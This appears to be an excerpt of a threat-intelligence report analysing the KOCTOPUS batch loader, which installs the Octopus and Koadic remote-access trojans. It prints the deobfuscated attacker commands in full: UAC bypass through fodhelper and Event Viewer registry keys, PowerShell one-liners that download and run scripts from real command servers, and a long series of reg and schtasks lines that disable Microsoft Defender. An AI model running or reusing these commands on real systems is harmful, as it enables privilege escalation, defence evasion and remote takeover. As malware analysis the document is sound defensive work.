@@ -1,0 +1,251 @@
+Batch Variant
+The batch files used by this actor are highly obfuscated with the BatchEncryption tool. BatchEncryption is an
+advanced batch obfuscation tool that uses a combination of known and custom environment variable encoding
+techniques.
+Figure 15: Overall Process
+In this section we provide the analysis of a batch file embedded within the most recent maldoc used by this actor.
+The following shows the obfuscated version of KOCTOPUS:
+Figure 16: KOCTOPUS Batch Variant Obfuscated
+Figure 17 shows the list of commands that will be executed by this loader after de-obfuscation.
+Figure 17: KOCTOPUS Batch Variant Not Obfuscated
+15
+This loader starts it activities by checking the OS version using the following command:
+```
+ for /f "tokens=2 delims=," %%i in ('wmic os get caption^,version
+ /format:csv') do set os=%%i
+```
+Then it looks for number 10 using the find command to identify if the OS is Windows 10. If that is the case, it
+attempts to bypass User Access Control (UAC) using fodhelper.exe and execute its commands with higher privilege.
+If the OS version is not 10, it performs UAC bypass through Event Viewer ( eventvwr.exe ).
+Fodhelper.exe has been used in Windows 10 to manage language settings. Since this process is running with
+highest privilege, an attacker can abuse it to execute its malicious commands with the same
+privilege fodhelper has. When the fodhelper.exe process starts it looks for the three registry keys shown below that
+by default do not exist. Therefore, an attacker can write its malicious commands in these registry keys to be
+executed by fodhelper.exe with the highest privilege.
+This loader has created these registry keys with a PowerShell command:
+```
+ && reg add HKCU\Software\Classes\ms-settings\shell\open\command /v
+ "DelegateExecute" /f && reg add HKCU\Software\Classes\ms settings\shell\open\command /d "cmd.exe /c powershell -WindowStyle Hidden  command \"IEX (New-Object
+ Net.WebClient).DownloadFile('http://23.98.155.192/sc.bat',,
+ 'C:\Users\Public\Libraries\sc.bat');\" C:\Users\Public\Libraries\sc.bat" /f
+```
+To execute the PowerShell command, fodhelper.exe needs to be executed:
+```
+ && START /W fodhelper.exe
+```
+Upon fodhelper execution, PowerShell is executed to download a batch file from a remote server and save it into
+the Libraries directory and finally execute it. At the end the loader performs the cleanup procedure by deleting the
+created registry keys with the following command:
+```
+ && reg delete HKCU\Software\Classes\ms-settings /f
+```
+If the OS version is not 10, Event Viewer is used to bypass UAC. When eventvwr.exe is executed it looks
+for mmc.exe in these two registry locations:
+Since the first registry key does not exist then mmc.exe is executed from the second location to load
+the eventvwr.msc file in order to display the information to the user. An attacker can create this registry key that
+doesn’t exist in order to execute malicious commands with administrative privileges. In this case the actor has
+created this registry key with the same PowerShell command as described in the fodhelper.exe bypass.
+16
+The downloaded batch file ( sc.bat ) has also been obfuscated using the BatchEncryption tool. After deobfuscation
+we can see this batch performs the following steps:
+
+Using reg.exe to disable, add or delete all registry keys related to Microsoft Defender and Microsoft
+Security Essentials. Also, it disables all the Scheduled tasks related to these security products by
+calling schtasks :
+
+```
+ reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v
+ "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v
+ "DisableAntiVirus" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v
+ "MpEnablePus" /t REG_DWORD /d "0" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+ Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+ Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+ Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+ Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+ Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v
+ "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v
+ "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v
+ "SpynetReporting" /t REG_DWORD /d "0" /f
+ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v
+ "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
+ reg add
+ "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v
+ "Start" /t REG_DWORD /d "0" /f
+ reg add
+ "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger"
+ /v "Start" /t REG_DWORD /d "0" /f
+ schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy
+ Refresh" /Disable
+ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender
+ Cache Maintenance" /Disable
+ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender
+ Cleanup" /Disable
+ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender
+ Scheduled Scan" /Disable
+ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender
+ Verification" /Disable
+reg delete
+ "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
+ " /v "Windows Defender" /f
+ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows
+ Defender" /f
+ reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v
+ "WindowsDefender" /f
+ reg delete "HKCR*\shellex\ContextMenuHandlers\EPP" /f
+```
+17
+```
+ reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
+ reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f reg add
+ "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d
+ "4" /f
+ reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t
+ REG_DWORD /d "4" /f
+ reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t
+ REG_DWORD /d "4" /f
+ reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t
+ REG_DWORD /d "4" /f
+ reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t
+ REG_DWORD /d "4" /f
+ reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v
+ "Start" /t REG_DWORD /d "4" /f
+ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+ /v EnableLUA /t REG_DWORD /d 0 /f
+ reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v
+ "Start" /t REG_DWORD /d "4" /f
+ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+ /v EnableLUA /t REG_DWORD /d 0 /f
+```
+
+Calling PowerShell.exe to download another batch file. The actor has used another URL shortener “is.gd”
+which redirects to a Github repository to download that batch file:
+
+```
+ powershell -WindowStyle Hidden -command "IEX (New-Object
+ Net.WebClient).DownloadFile('https://is.gd/xbQIQ2','C:\Users\Public\Librarie
+ s\pus.bat');" C:\Users\Public\Libraries\pus.bat
+```
+The pus.bat script is also obfuscated by the BatchEncryption tool and executes the following PowerShell command.
+This command connects to its server to deploy its first multi-stage RAT which is Octopus:
+```
+ powershell -w hidden "Add-Type -AssemblyName System.Core;IEX (New-Object
+ Net.WebClient).DownloadString('http://hpsj.firewall gateway.net:80/hpjs.php');"
+```
+
+Performing the following actions which in fact make both Octopus and Koadic persistence through both
+the AutoRun registry key and scheduled task.
+
+18
+Octopus Persistence:
+
+
+Host name (with the addition of five random characters to the end)
+
+
+User name (if the user name has the administrator role it adds “*” to it)
+
+
+OS version
+
+
+OS architecture
+
+
+The process id that is executing this PowerShell script
+
+
+Victim’s Network domain
+
+
+Then it builds a header with the following format:
+19
+```
+ $HEADER = "$hostname, $username, $OS_version, $OS_arch, $process_id, $domain"
+```
+In the next step, it encrypts the header using AES encryption and then encodes the generated encrypted header
+using Base64. The Key and IV for encryption are Base64 hardcoded.
+Figure 19: Encryption function
+Then it sends an HTTP get request to its server with the generated header as authorization header field.
+Figure 20: Http get request
+After sending the request, it goes into a loop to receive commands from the server. The received commands are
+specific to the victim and the generated URL is the combination of the C&C URL and generated host name. The
+received commands are Base64 encoded and AES encrypted and therefore it first decodes and decrypts the
+commands and then based on the commands it does the required actions.
+20
+Figure 21: Commands
+Here is the list of commands:
+
+
+False: If the command is False it does nothing.
+
+
+Report: It collects victim’s info including list of all of the running processes, local IP address, OS version,
+last boot time, OS locale and current time and then encrypts and Base64 encodes them and sends them in
+
+
+the authorization HTTP field to the server.
+
+
+Download: Upload the content of a specified file to the server.
+
+
+reset-pc: It seems this feature is not still implemented.
+
+
+It also deploys another variant of Octopus agent through JavaScript ( mshta http://hpsj[.]firewall-
+gateway[.]net:8080/hta ). This script calls the PowerShell to download the Octopus agent.
+21
+Figure 22: Js script
+Figure 23: PowerShell command after deobfuscation
+After deploying Octopus it deploys Koadic by calling mshta :
+The actor has used mshta and rundll32.exe for Koadic stagers.
+22
+Figure 24: Downloaded js
+Figure 25: Deobfuscated js
+The deobfuscated script collects the following information from the victim and then builds a URL and command
+and makes an HTTP request to the Koadic server.
+
+
+Checks SeDebugPrivilege through “whoami /all” command
+
+
+Gets OS version and Build by reading their relative registry locations
+
+
+Gets group policy history through reading registry location
+
+
+Gets processor architecture
+
+
+Lists directories in temp folder
+
+
+Gets the contents of the IP routing table by executing the “route print” command
+
+
+Gets computer name and username
+
+
+Gets Windows code page
+
+
+23
+Figure 26: Data collection
+In this case, we observed that Koadic acted as a downloader to download and execute RMS, LuminosityLink. In
+some other cases, the actor used Koadic to drop njRat, Remcos and Quasar RAT.
+24
+25
+26
+Figure 28: ADS-Backdoor
